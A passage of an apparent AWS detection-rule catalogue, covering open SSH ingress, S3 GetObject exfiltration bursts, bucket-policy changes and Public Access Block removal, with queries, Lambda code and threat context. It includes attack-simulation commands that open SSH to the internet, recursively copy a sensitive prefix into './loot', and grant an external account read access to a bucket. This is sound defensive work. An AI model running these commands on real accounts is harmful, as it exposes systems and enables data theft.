        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "AuthorizeSecurityGroupIngress", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { ec2: { security_group: { id: "sg-xxx", ingress: [{ port_start: 22, port_end: 22, cidr_ipv4: "0.0.0.0/0" }] } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Port and Protocol Risk", description: "Classify the added rule by protocol and port range so the alert reflects the difference between expected public web traffic and dangerous exposure of admin or data ports.", examples: ["tcp/22 SSH", "tcp/3389 RDP", "tcp/5432 PostgreSQL", "ipProtocol=-1 all traffic"], falsePositiveReduction: "Reduces noise from approved 80/443 exposure and raises urgency for management, database, and all-traffic rules." },
        { dimension: "Asset Attachment and Reachability", description: "Resolve the security group to attached ENIs, instances, and load balancers, then determine whether those assets are actually internet-reachable.", examples: ["SG attached to instance with public IP", "SG attached only to private ENIs", "SG currently unattached"], falsePositiveReduction: "A public CIDR on an unattached or private-only SG is less urgent than the same rule on a public EC2 or internet-facing ALB." },
        { dimension: "Asset Criticality and Workload Context", description: "Add business and workload metadata so exposure of production admin hosts, databases, or regulated applications is prioritized above sandbox or edge web tiers.", examples: ["Tag env=prod", "CMDB service owner payments-api", "Database node in regulated environment"], falsePositiveReduction: "Known public-facing web tiers can be tuned differently from sensitive internal systems that should never be internet-exposed." },
        { dimension: "Identity and Change Context", description: "Characterize who made the change and whether it came from expected automation or suspicious ad hoc modification.", examples: ["Terraform execution role", "Network admin SSO role", "Developer IAM user from unusual IP"], falsePositiveReduction: "Expected IaC and network-admin changes can be allowlisted, while manual one-off exposure changes remain high signal." },
      ],
      logicExplanation: {
        humanReadable: "This detection should identify EC2 security-group ingress rules that introduce 0.0.0.0/0 as a source CIDR, because that change can immediately expose protected services to the internet. The baseline CloudTrail match is intentionally simple, but production value comes from interpreting the nested ipPermissions structure so analysts know exactly which protocol and ports were opened.",
        conditions: ["eventSource equals ec2.amazonaws.com", "eventName equals AuthorizeSecurityGroupIngress", "requestParameters.ipPermissions contains an IPv4 CIDR of 0.0.0.0/0", "severity should be adjusted using protocol, port range, and whether the affected security group is attached to reachable assets"],
        tuningGuidance: "1. Treat public exposure of management and data ports as high priority by default. 2. Maintain allowlists for approved public-facing services such as ALBs or web tiers exposing 80/443. 3. Enrich every alert with SG attachments, public-IP status, subnet routing, and service ownership before suppression.",
        whenToFire: "Fire whenever a new ingress rule introduces 0.0.0.0/0, then prioritize based on protocol, port, and asset reachability.",
      },
      simulationCommand: "aws ec2 authorize-security-group-ingress --group-id sg-0abc123456789def0 --ip-permissions '[{\"IpProtocol\":\"tcp\",\"FromPort\":22,\"ToPort\":22,\"IpRanges\":[{\"CidrIp\":\"0.0.0.0/0\",\"Description\":\"lab-open-ssh\"}]}]'",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium (approved public web services and IaC workflows can legitimately open 80/443, but exposure of admin or data ports is usually high signal)",
        expectedVolume: "Low to moderate depending on infrastructure change frequency and how much public-facing infrastructure the environment runs",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "CloudWatch Logs Insights", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes for CloudTrail analytics; Real-time: EventBridge or SIEM streaming on AuthorizeSecurityGroupIngress with Lambda enrichment for SG attachments and reachability.",
        considerations: ["Without enrichment, this is best treated as a configuration-exposure signal rather than confirmed internet exposure.", "Port and protocol parsing should be first-class in the detection pipeline.", "Extend coverage to IPv6 ::/0 and newer SG rule APIs to avoid blind spots."],
      },
    },
  },

  // --- S3 ---
  {
    id: "det-003",
    title: "Potential S3 Exfiltration via Anomalous GetObject Burst",
    description: "Detects unusual bursts of S3 GetObject activity against sensitive buckets or prefixes that may indicate data exfiltration.",
    awsService: "S3",
    relatedServices: ["IAM", "CloudTrail"],
    severity: "High",
    tags: ["S3", "Data Exfiltration", "Anomaly"],
    logSources: ["AWS CloudTrail S3 Data Events"],
    falsePositives: ["Legitimate data pipeline operations", "Backup processes"],
    rules: {
      sigma: `title: Potential S3 Exfiltration via Anomalous GetObject Burst
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName: GetObject
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=GetObject
| bin _time span=15m
| stats count as downloads dc(requestParameters.key) as distinct_objects values(sourceIPAddress) as src_ips by _time, userIdentity.arn, requestParameters.bucketName
| where downloads >= 25 AND distinct_objects >= 25
| sort -downloads`,
      cloudtrail: `SELECT userIdentity.arn, requestParameters.bucketName,
       COUNT(*) as download_count,
       COUNT(DISTINCT requestParameters.key) as distinct_objects
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName = 'GetObject'
GROUP BY userIdentity.arn, requestParameters.bucketName
HAVING download_count >= 25
   AND distinct_objects >= 25
ORDER BY download_count DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.bucketName, requestParameters.key, sourceIPAddress
| filter eventName = "GetObject"
| stats count(*) as downloads, count_distinct(requestParameters.key) as distinct_objects by bin(15m), userIdentity.arn, requestParameters.bucketName
| filter downloads >= 25 and distinct_objects >= 25
| sort downloads desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["GetObject"] } }, null, 2),
      lambda: `"""
Potential S3 Exfiltration via Anomalous GetObject Burst
Trigger: Streamed CloudTrail S3 data events into a stateful analytics pipeline.
Use for: Sliding-window GetObject burst detection with actor and bucket baselines.
"""

WINDOW_MIN_DOWNLOADS = 25
WINDOW_MIN_DISTINCT_OBJECTS = 25

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "s3.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "GetObject":
        return {"matched": False}

    return {
        "matched": "stateful-evaluation-required",
        "key": {
            "actor": detail.get("userIdentity", {}).get("arn"),
            "bucket": detail.get("requestParameters", {}).get("bucketName"),
            "object_key": detail.get("requestParameters", {}).get("key"),
            "source_ip": detail.get("sourceIPAddress"),
        },
        "thresholds": {
            "min_downloads": WINDOW_MIN_DOWNLOADS,
            "min_distinct_objects": WINDOW_MIN_DISTINCT_OBJECTS,
        },
    }
`,
    },
    relatedAttackSlugs: ["s3-data-exfiltration"],
    telemetry: { primaryLogSource: "AWS CloudTrail S3 Data Events", generatingService: "s3.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "GetObject", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { bucketName: "my-bucket", key: "sensitive/data.csv" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the identity and bucket with high download volume.", "Verify if the activity matches known pipelines or backups.", "Check for anomalous download patterns (time, volume).", "Review S3 access logs for exfiltration indicators."],
    testingSteps: ["Enable S3 data events for a test bucket.", "Perform many GetObject operations.", "Run the detection to confirm volume-based alert triggers."],
    lifecycle: {
      whyItMatters: "S3 object reads are the last-mile action in many AWS data theft scenarios, but raw GetObject activity is noisy. A production-ready detection should treat unusual S3 download activity as a behavioral anomaly on sensitive data, not as a single static count or byte threshold.",
      threatContext: {
        attackerBehavior: "An attacker who has obtained AWS credentials, assumed a role, or found a bucket policy path to data access will often enumerate and download objects from S3 using the AWS CLI, SDKs, console, access points, or pre-signed URLs. In practice this often appears as a burst of GetObject requests against a sensitive bucket or prefix, sometimes preceded by ListBucket activity or recent STS role assumption.",
        realWorldUsage: "S3 download abuse is a common cloud post-compromise pattern in red-team tradecraft, cloud pentests, and intrusion investigations involving stolen workload credentials, IMDS abuse, over-broad data-read roles, and cross-account bucket access.",
        whyItMatters: "Once an attacker can read sensitive S3 objects, the data theft objective is effectively complete. Detecting unusual object access volume or novelty can provide one of the few chances to catch exfiltration before the credential is revoked and the actor disappears.",
        riskAndImpact: "Undetected S3 exfiltration can lead to theft of regulated data, intellectual property, source code, backups, customer records, model artifacts, and internal documents.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail S3 Data Events (read events for AWS::S3::Object)", "Optional: Amazon S3 server access logs for exact bytes-sent measurement", "Optional: CloudTrail aggregated data events for count-based summaries at scale"],
        requiredFields: ["eventSource", "eventName", "eventTime", "awsRegion", "readOnly", "userIdentity.type", "userIdentity.arn", "userIdentity.accountId", "sourceIPAddress", "userAgent", "requestParameters.bucketName", "requestParameters.key", "resources.ARN", "recipientAccountId", "additionalEventData.AuthenticationMethod", "additionalEventData.SignatureVersion", "additionalEventData.bytesTransferredOut"],
        loggingRequirements: ["CloudTrail management events are not sufficient; GetObject is an S3 object-level data event and requires S3 data events to be explicitly enabled.", "Read data events must be enabled for the relevant S3 buckets, prefixes, or account scope.", "Prefer advanced event selectors to limit cost by scoping to AWS::S3::Object, read events, relevant buckets/prefixes, and optionally eventName=GetObject."],
        limitations: ["CloudTrail S3 data events are off by default, cost-bearing, and not retroactive.", "Static request-count thresholds are weak exfiltration heuristics: many small objects can create high counts, while a few very large objects can exfiltrate significant data with low counts.", "Range requests, retries, scanners, ETL jobs, and backup tools can distort both request count and inferred byte volume."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "CloudTrail event time" },
          { rawPath: "eventSource", normalizedPath: "event.provider", notes: "S3 API provider" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "GetObject object-read action" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Principal performing the object read" },
          { rawPath: "requestParameters.bucketName", normalizedPath: "aws.s3.bucket.name", notes: "Target bucket" },
          { rawPath: "requestParameters.key", normalizedPath: "aws.s3.object.key", notes: "Target object key" },
          { rawPath: "additionalEventData.bytesTransferredOut", normalizedPath: "aws.s3.bytes_out", notes: "Optional; only use after validating field availability in your telemetry" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: "data_access", type: "access", action: "GetObject", provider: "s3.amazonaws.com", read_only: true, outcome: "success" },
          user: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/DataReadRole/attacker-session" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          source: { ip: "203.0.113.50" },
          user_agent: { original: "aws-cli/2.15.0" },
          aws: { s3: { bucket: { name: "company-sensitive-data" }, object: { key: "finance/2025/q1-report.xlsx" }, bytes_out: 15728640 } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Data Sensitivity and Bucket Criticality", description: "Classify the target bucket or prefix by business sensitivity, environment, and expected access pattern.", examples: ["PII bucket", "Production backup bucket", "Finance reports prefix", "Public website asset bucket"], falsePositiveReduction: "Suppresses benign bulk reads from low-risk content and escalates access to sensitive buckets, prefixes, and regulated datasets." },
        { dimension: "Identity and Access Path Context", description: "Enrich the actor with principal type, owning team, workload vs. human identity, usual role family, and whether the access path is direct or cross-account.", examples: ["Human IAM user", "Assumed CI role", "Cross-account vendor role", "Workload role on EC2"], falsePositiveReduction: "Separates expected platform automation from suspicious human or unexpected workload-driven download activity." },
        { dimension: "Network and Session Novelty", description: "Correlate source IP, ASN, geolocation, user agent, auth type, and session naming patterns.", examples: ["First-seen public IP for actor", "CLI instead of SDK", "AuthenticationMethod=QueryString", "New country or ASN"], falsePositiveReduction: "Raises fidelity when otherwise-normal object reads originate from a novel network path or access method." },
        { dimension: "Behavioral Baseline", description: "Track historical GetObject counts, distinct objects, normal buckets/prefixes, and normal time-of-day patterns by actor, bucket, and prefix over a lookback window.", examples: ["First time actor accessed this bucket", "10x above actor's 30-day hourly median", "First time reading more than 50 distinct objects in 15 minutes"], falsePositiveReduction: "Converts noisy raw volume into an anomaly score anchored in how the actor and bucket normally behave." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not fire on every GetObject event and should not depend on a single static threshold such as 100 downloads or 1 GB. The credible production pattern is a windowed anomaly over CloudTrail S3 data events: identify an actor, bucket, or prefix whose GetObject activity materially exceeds its own historical baseline, then require at least one risk amplifier such as sensitive data access, first-seen actor-to-bucket usage, unusual IP or user agent, cross-account access, or a recent credential or policy anomaly. Request count is the portable primary metric because it can always be derived from raw GetObject events, while byte volume should be treated as a secondary score only where bytesTransferredOut has been validated or S3 server access logs provide exact byte data.",
        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals GetObject", "log source is CloudTrail S3 data events and readOnly equals true", "within a 15-minute or 1-hour window, the actor + bucket + prefix combination exceeds both a minimum activity floor and its historical baseline", "recommended minimum floor: at least 25 GetObject events and at least 25 distinct object keys before anomaly scoring"],
        tuningGuidance: "1. Maintain separate baselines for human users, workload roles, backup roles, analytics jobs, and replication-style automation. 2. Exclude or down-rank approved backup, ETL, ML, and content-distribution identities instead of globally allowlisting entire buckets. 3. Use bucket and prefix sensitivity tags so that bursty reads on low-risk asset buckets do not compete with reads on finance, identity, or backup data.",
        whenToFire: "Fire when a principal performs an unusually large or novel burst of GetObject activity against a sensitive bucket or prefix within a bounded window and the activity deviates meaningfully from that principal's established behavior.",
      },
      simulationCommand: "aws s3 cp s3://target-bucket/sensitive-prefix ./loot --recursive",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium (drops to Medium-Low after sensitive-bucket scoping, actor baselines, and allowlisting of expected bulk-download roles)",
        expectedVolume: "Org-dependent; low in mature environments, but bursty in analytics-, backup-, or content-heavy accounts before tuning",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena over CloudTrail logs", "CloudTrail Lake", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda + state store"],
        scheduling: "Batch: every 5-15 minutes in Athena, CloudTrail Lake, or SIEM. Near-real-time requires EventBridge or stream ingestion into a stateful detector with 15-minute and 1-hour windows.",
        considerations: ["Do not ship this as a pure static threshold rule if the goal is production exfiltration detection; use baseline-plus-risk-context logic.", "Keep a separate count-burst detector and optional exact-byte detector so unsupported byte fields do not weaken the core rule.", "Scope S3 data event selectors to sensitive buckets or prefixes where possible to control cost while preserving meaningful coverage."],
      },
    },
  },
  {
    id: "det-017",
    title: "S3 Bucket Policy Modified",
    description: "Detects modifications to S3 bucket policies which could expose data publicly or to unauthorized accounts.",
    awsService: "S3",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["S3", "Bucket Policy", "Data Exposure"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate infrastructure changes via Terraform/CloudFormation"],
    rules: {
      sigma: `title: S3 Bucket Policy Modified
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName:
      - PutBucketPolicy
      - DeleteBucketPolicy
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail (eventName=PutBucketPolicy OR eventName=DeleteBucketPolicy)
| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName IN ('PutBucketPolicy', 'DeleteBucketPolicy')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.policy, sourceIPAddress
| filter eventName in ["PutBucketPolicy", "DeleteBucketPolicy"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketPolicy", "DeleteBucketPolicy"] } }, null, 2),
      lambda: `"""
S3 Bucket Policy Modified
Trigger: EventBridge rule matching PutBucketPolicy or DeleteBucketPolicy.
Use for: Real-time policy parsing and exposure analysis.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "s3.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") not in ("PutBucketPolicy", "DeleteBucketPolicy"):
        return {"matched": False}

    return {
        "matched": "requires-policy-analysis",
        "alert": {
            "rule_id": "det-017",
            "title": "S3 Bucket Policy Modified",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
            "event_name": detail.get("eventName"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["s3-data-exfiltration"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.policy", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { bucketName: "my-bucket", policy: '{"Statement":[{"Principal":{"AWS":"*"},"Action":"s3:GetObject"}]}' }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who modified the bucket policy.", "Inspect the new policy for public or cross-account access.", "Verify if the change was from IaC (Terraform/CloudFormation).", "Review recent S3 access from external principals."],
    testingSteps: ["Modify an S3 bucket policy (PutBucketPolicy or DeleteBucketPolicy).", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "S3 bucket policy changes are common enough to create noise, but they become high signal when the new policy grants public access, introduces unapproved cross-account principals, or removes prior restrictions on sensitive buckets.",
      threatContext: {
        attackerBehavior: "An attacker with s3:PutBucketPolicy can rewrite a bucket policy to grant anonymous read access, delegate access to an attacker-controlled AWS account, or weaken restrictive conditions that previously constrained access by source VPC, source IP, organization, or role.",
        realWorldUsage: "Bucket policy abuse is a well-established cloud exposure pattern: compromised admin roles, overprivileged automation, and misused CI/CD identities can all introduce public or external-account access during post-compromise collection and exfiltration.",
        whyItMatters: "A generic PutBucketPolicy event is only a configuration-change signal, but a policy change that creates public or unapproved cross-account access is often a direct precursor to data exposure.",
        riskAndImpact: "If this goes undetected, sensitive data can become readable by the internet or by external AWS accounts, often without obvious object-level activity at the moment of change.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "eventTime", "awsRegion", "recipientAccountId", "userIdentity.type", "userIdentity.arn", "sourceIPAddress", "userAgent", "requestParameters.bucketName", "requestParameters.policy", "errorCode"],
        loggingRequirements: ["CloudTrail management events for S3 must be enabled and retained with full requestParameters.", "The pipeline must preserve the full policy document from requestParameters.policy where possible.", "No S3 data events are required for the policy-change signal itself, but follow-on access monitoring benefits from S3 data events on sensitive buckets."],
        limitations: ["PutBucketPolicy is noisy in environments that use Terraform, CloudFormation, or deployment pipelines.", "DeleteBucketPolicy is not inherently public exposure; by itself it may remove access rather than widen it.", "Distinguishing true widening requires parsing principals, actions, resources, and conditions, then comparing them to the prior policy or an allowlist of approved external accounts."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "s3.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "PutBucketPolicy or DeleteBucketPolicy" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "CloudTrail event time" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor that changed the policy" },
          { rawPath: "requestParameters.bucketName", normalizedPath: "aws.s3.bucket.name", notes: "Target bucket" },
          { rawPath: "requestParameters.policy", normalizedPath: "aws.s3.bucket.policy.json", notes: "Full submitted policy body" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "PutBucketPolicy", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { s3: { bucket: { name: "my-bucket" }, policy: { exposure: { principal_scope: "public", access_level: "read" } } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Identity And Change Provenance", description: "Attach ownership and execution context for the actor, including whether the session came from Terraform, CloudFormation, GitHub Actions, SSO admin, or a human console session.", examples: ["session issuer ARN", "SSO permission set name", "CI/CD runner role"], falsePositiveReduction: "Known deployment identities can be downgraded unless the resulting policy widens access beyond approved principals." },
        { dimension: "Policy Exposure Analysis", description: "Parse the new bucket policy to classify whether it introduces public access, wildcard principals, or external AWS accounts outside the allowlist or AWS Organization.", examples: ["Principal: *", "Principal.AWS contains arn:aws:iam::999999999999:root", "missing aws:PrincipalOrgID condition"], falsePositiveReduction: "This is the key separator between harmless policy churn and genuine exposure." },
        { dimension: "Bucket Criticality And Data Sensitivity", description: "Join the bucket to asset inventory, tags, ownership, environment, and data classification.", examples: ["tags: env=prod", "bucket purpose: static website or backups", "contains PII or customer exports"], falsePositiveReduction: "Expected public-serving buckets or low-sensitivity assets can be scoped differently from sensitive storage." },
        { dimension: "Post-Change Access Validation", description: "Validate whether the bucket is effectively public or externally accessible using bucket policy status, org-account allowlists, and Access Analyzer findings.", examples: ["GetBucketPolicyStatus.IsPublic", "IAM Access Analyzer external access finding", "approved partner account list"], falsePositiveReduction: "This prevents over-alerting on policy documents that changed syntax or internal delegation but did not create real exposure." },
      ],
      logicExplanation: {
        humanReadable: "This detection should treat all PutBucketPolicy and DeleteBucketPolicy events as important configuration changes, but it should not promote every policy edit to a high-fidelity alert. The production-grade version parses the submitted policy and asks whether access was widened to the public or to unapproved external AWS principals, or whether restrictive conditions were removed from a sensitive bucket.",
        conditions: ["eventSource equals s3.amazonaws.com", "eventName is PutBucketPolicy or DeleteBucketPolicy", "errorCode does not exist", "for high-fidelity alerting on PutBucketPolicy: parsed policy grants Principal * or unapproved external AWS principals, or removes prior restrictive conditions on a sensitive bucket"],
        tuningGuidance: "1. Maintain an allowlist of approved automation identities and approved external account IDs or organization IDs. 2. Compare the new policy hash and principal set to the prior known-good version. 3. Score same-account delegation lower than external-account delegation, and public access highest.",
        whenToFire: "Fire a baseline configuration event for every successful bucket policy change, but reserve high-severity alerting for PutBucketPolicy events that newly widen access to the public or to unapproved external accounts.",
      },
      simulationCommand: "tmp=$(mktemp) && cat > \"$tmp\" <<'EOF'\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\"Sid\":\"AllowExternalRead\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999999999999:root\"},\"Action\":[\"s3:GetObject\"],\"Resource\":[\"arn:aws:s3:::my-bucket/*\"]}]\n}\nEOF\naws s3api put-bucket-policy --bucket my-bucket --policy \"file://$tmp\"",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium for raw policy-change events; Medium-Low when parsed for public or unapproved cross-account exposure and scoped by identity provenance",
        expectedVolume: "Low in smaller environments, but moderate in Terraform- or CloudFormation-heavy accounts unless deployment identities are recognized",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena over CloudTrail logs", "CloudTrail Lake", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda for real-time parsing and enrichment"],
        scheduling: "Batch: every 5-15 minutes in Athena, CloudTrail Lake, or SIEM. Real-time is practical with EventBridge plus a Lambda that parses requestParameters.policy and checks allowlists or prior-policy state.",
        considerations: ["Keep the detection split conceptually into baseline audit coverage and escalated exposure alerts.", "Persist a prior-policy hash or normalized principal set if you want to reliably detect widening versus routine rewrites.", "Correlate with bucket sensitivity, IAM Access Analyzer findings, and S3 data-event reads for materially stronger signal."],
      },
    },
  },
  {
    id: "det-018",
    title: "S3 Bucket Made Public",
    description: "Detects when S3 Public Access Block settings are removed, potentially exposing bucket contents.",
    awsService: "S3",
    relatedServices: [],
    severity: "Critical",
    tags: ["S3", "Public Access", "Data Exposure"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Static website hosting buckets"],
    rules: {
      sigma: `title: S3 Public Access Block Removed
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_delete:
    eventSource: s3.amazonaws.com
    eventName: DeletePublicAccessBlock
  selection_put:
    eventSource: s3.amazonaws.com
    eventName: PutPublicAccessBlock
  weaken_policy:
    requestParameters.PublicAccessBlockConfiguration.BlockPublicPolicy: false
  weaken_restrict:
    requestParameters.PublicAccessBlockConfiguration.RestrictPublicBuckets: false
  weaken_acl_block:
    requestParameters.PublicAccessBlockConfiguration.BlockPublicAcls: false
  weaken_acl_ignore:
    requestParameters.PublicAccessBlockConfiguration.IgnorePublicAcls: false
  condition: selection_delete or (selection_put and 1 of weaken_*)
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=DeletePublicAccessBlock OR eventName=PutPublicAccessBlock)
| where eventName="DeletePublicAccessBlock" OR requestParameters.PublicAccessBlockConfiguration.BlockPublicPolicy=false OR requestParameters.PublicAccessBlockConfiguration.RestrictPublicBuckets=false OR requestParameters.PublicAccessBlockConfiguration.BlockPublicAcls=false OR requestParameters.PublicAccessBlockConfiguration.IgnorePublicAcls=false
| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND (
    eventName = 'DeletePublicAccessBlock'
    OR (
      eventName = 'PutPublicAccessBlock'
      AND (
        requestParameters.PublicAccessBlockConfiguration.BlockPublicPolicy = false
        OR requestParameters.PublicAccessBlockConfiguration.RestrictPublicBuckets = false
        OR requestParameters.PublicAccessBlockConfiguration.BlockPublicAcls = false
        OR requestParameters.PublicAccessBlockConfiguration.IgnorePublicAcls = false
      )
    )
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress
| filter eventSource = "s3.amazonaws.com"
| filter eventName = "DeletePublicAccessBlock" or (eventName = "PutPublicAccessBlock" and (requestParameters.PublicAccessBlockConfiguration.BlockPublicPolicy = false or requestParameters.PublicAccessBlockConfiguration.RestrictPublicBuckets = false or requestParameters.PublicAccessBlockConfiguration.BlockPublicAcls = false or requestParameters.PublicAccessBlockConfiguration.IgnorePublicAcls = false))
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["DeletePublicAccessBlock", "PutPublicAccessBlock"] } }, null, 2),
      lambda: `"""
S3 Bucket Made Public
Trigger: EventBridge rule matching DeletePublicAccessBlock or PutPublicAccessBlock.
Use for: Real-time alerting on weakened bucket-level public-access guardrails.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "s3.amazonaws.com":
        return {"matched": False}

    event_name = detail.get("eventName")
    if event_name == "DeletePublicAccessBlock":
        return {
            "matched": True,
            "alert": {
                "rule_id": "det-018",
                "title": "S3 Bucket Made Public",
                "severity": "Critical",
                "actor": detail.get("userIdentity", {}).get("arn"),
                "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
                "source_ip": detail.get("sourceIPAddress"),
                "event_time": detail.get("eventTime"),
            },
        }

    if event_name == "PutPublicAccessBlock":
        config = detail.get("requestParameters", {}).get("PublicAccessBlockConfiguration", {})
        weakened = config.get("BlockPublicPolicy") is False or config.get("RestrictPublicBuckets") is False or config.get("BlockPublicAcls") is False or config.get("IgnorePublicAcls") is False
        if weakened:
            return {
                "matched": True,
                "alert": {
                    "rule_id": "det-018",
                    "title": "S3 Bucket Made Public",
                    "severity": "Critical",
                    "actor": detail.get("userIdentity", {}).get("arn"),
                    "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
                    "source_ip": detail.get("sourceIPAddress"),
                    "event_time": detail.get("eventTime"),
                },
            }

    return {"matched": False}
`,
    },
    relatedAttackSlugs: ["s3-data-exfiltration"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.bucketName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "DeletePublicAccessBlock", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { bucketName: "my-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who removed the public access block.", "Assess whether the bucket contains sensitive data.", "Verify if static website hosting was intended.", "Restore PublicAccessBlock if unauthorized."],
    testingSteps: ["Remove PublicAccessBlock from a test bucket.", "Verify CloudTrail captures DeletePublicAccessBlock.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
